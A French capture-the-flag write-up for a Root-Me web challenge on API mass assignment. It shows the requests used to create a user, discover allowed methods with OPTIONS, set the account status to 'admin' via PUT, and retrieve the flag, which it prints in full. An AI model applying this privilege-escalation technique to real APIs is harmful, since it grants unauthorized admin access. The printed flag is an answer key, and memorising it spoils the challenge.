## Challenges

### Serveur Web

### Challenge: API - Mass Assignment

#### Problème

Cette épreuve vous invite à vérifier que tout est sécurisé.

#### Etape1: Creer un User 

Dans cette étape, nous démarrons le défi. Dans la partie api/sign-up, cliquez sur "try out" et remplissez les informations du nouvel utilisateur demandées.

```
{
  "username": "Chayma",
  "password": "Chama"
}
```
Ensuite, cliquez sur "Execute". Un message s'affiche : 

```
{
  "message": "User created successfully"
}
```
Dans la partie api/login, cliquez sur "try out" et remplissez les informations du nouvel utilisateur demandées. 

```
{
  "username": "Chayma",
  "password": "Chama"
}
```
Ensuite, cliquez sur "Execute". Un message s'affiche : 

```
{
  "message": "Logged in successfully"
}
```
Ainsi, l'utilisateur existe et peut se connecter correctement.

#### Etape2: Résolution 

En regardant la vidéo proposée par le défi, on constate que la solution sera en rapport avec les méthodes HTTP.

Sur "Insomnia" (ou "Postman"), copiez l'URL de l'API "http://challenge01.root-me.org:59090/api/user" et effectuez une requête de type "GET" avec le contenu suivant :

```
{
  "username": "Chayma",
  "password": "Chama"
}
```
Dans les headers on active " Content-Type" , puis puis envoyez la requête. Vous obtiendrez le message suivant dans "preview":
```
 {
	
	"note": "",
	"status": "guest",
	"userid": 3,
	"username": "Chayma"
}

```
Pour vérifier les droits de l'utilisateur, effectuez une requête de type "OPTIONS" avec l'URL suivante :

```
http://challenge01.root-me.org:59090/api/user
```
Après avoir envoyé la requête, vous obtiendrez un ensemble d'informations dans les " Headers" , Nous nous intéressons aux droits :

Allow: OPTIONS, GET, PUT

Ainsi, avec la méthode PUT, on peut changer les droits de l'utilisateur. Changeons son statut en "admin". Pour ce faire, effectuez une requête de type "PUT" avec l'URL suivante :

```
http://challenge01.root-me.org:59090/api/user
```
et le contenu suivant :
```
{
  "status": "admin",
}
``` 

**NB :** Si l'utilisateur n'est pas connecté, on ne peut pas accéder à cette page.


#### Solution

Copiez l'URL de l'API "http://challenge01.root-me.org:59090/api/flag" et effectuez une requête de type "GET". Vous obtiendrez le message suivant dans "preview":

```
{
	"message": "Hello admin, here is the flag : RM{4lw4yS_ch3ck_0pt10ns_m3th0d}."
}
```
Le flag est la note de l'utilisateur admin : `RM{4lw4yS_ch3ck_0pt10ns_m3th0d}`.